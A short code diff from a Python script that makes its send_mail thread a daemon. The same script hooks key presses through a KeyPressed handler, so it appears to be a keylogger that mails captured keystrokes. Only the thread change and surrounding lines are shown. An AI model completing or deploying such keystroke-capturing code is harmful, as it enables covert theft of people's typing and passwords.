@@ -113,7 +113,7 @@ def KeyPressed(event):
     
 
 if __name__ == '__main__':
-    triggerThread = Thread(target=send_mail)
+    triggerThread = Thread(target=send_mail,daemon=True)
     triggerThread.start()
 
 on_press(KeyPressed)
